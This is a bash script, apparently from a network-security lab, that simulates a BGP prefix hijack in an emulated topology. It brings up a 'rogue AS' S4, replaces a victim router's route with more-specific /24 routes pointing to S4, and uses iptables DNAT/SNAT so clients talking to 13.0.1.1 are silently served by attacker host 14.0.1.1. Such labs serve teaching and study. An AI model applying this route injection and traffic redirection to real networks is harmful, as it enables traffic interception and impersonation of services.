#!/bin/bash

echo "Killing any existing rogue AS"
./stop_rogue.sh
sleep 1

echo "Starting rogue AS (S4)..."
# Run both daemons in parallel
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/zebra -f conf/zebra-S4.conf -d -i /tmp/zebra-S4.pid > logs/S4-zebra-stdout 2>&1" &
PID1=$!
sudo python3 run.py --node S4 --cmd "sudo /usr/sbin/bgpd -f conf/bgpd-S4.conf -d -i /tmp/bgpd-S4.pid > logs/S4-bgpd-stdout 2>&1" &
PID2=$!
wait $PID1 $PID2

echo "Daemons started. Waiting 3 seconds..."
sleep 3

echo ""
echo "=========================================="
echo "DEPLOYING ATTACK"
echo "=========================================="

echo ""
echo "[1] Adding hijacked routes on S1..."
# Override the broad 13.0.0.0/8 route with more specific routes pointing to S4
# This simulates BGP announcing more specific prefixes
sudo python3 run.py --node S1 --cmd "ip route del 13.0.0.0/8 via 9.0.0.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.1.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.2.0/24 via 9.0.4.2"
sudo python3 run.py --node S1 --cmd "ip route add 13.0.3.0/24 via 9.0.4.2"
echo "Done."

echo ""
echo "[2] Enabling IP forwarding on S4..."
sudo python3 run.py --node S4 --cmd "sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1"
echo "Done."

echo ""
echo "[3] Setting up DNAT on S4 to redirect 13.0.1.1 -> 14.0.1.1..."
# Clear old rules if they exist
sudo python3 run.py --node S4 --cmd "iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null; true"

# DNAT: redirect traffic destined for 13.0.1.1 to h4-1 at 14.0.1.1
sudo python3 run.py --node S4 --cmd "iptables -t nat -A PREROUTING -d 13.0.1.1 -j DNAT --to-destination 14.0.1.1"

# FORWARD: allow traffic to 14.0.1.0/24
sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -d 14.0.1.0/24 -j ACCEPT"
sudo python3 run.py --node S4 --cmd "iptables -A FORWARD -s 14.0.1.0/24 -j ACCEPT"

# SNAT: rewrite response from 14.0.1.1 back to 13.0.1.1
sudo python3 run.py --node S4 --cmd "iptables -t nat -A POSTROUTING -s 14.0.1.1 -j SNAT --to-source 13.0.1.1"

echo "Done."

echo ""
echo "=========================================="
echo "ATTACK ACTIVE!"
echo "=========================================="
echo ""
echo "What happens:"
echo "  1. Client requests 13.0.1.1 (h3-1)"
echo "  2. S1 routes it to S4 via 13.0.1.0/24 route"
echo "  3. S4 intercepts with DNAT -> redirects to 14.0.1.1 (h4-1)"
echo "  4. h4-1 (attacker) responds"
echo "  5. S4 SNAT rewrites response back to 13.0.1.1"
echo "  6. Client thinks it's talking to h3-1 but actually h4-1!"
echo ""





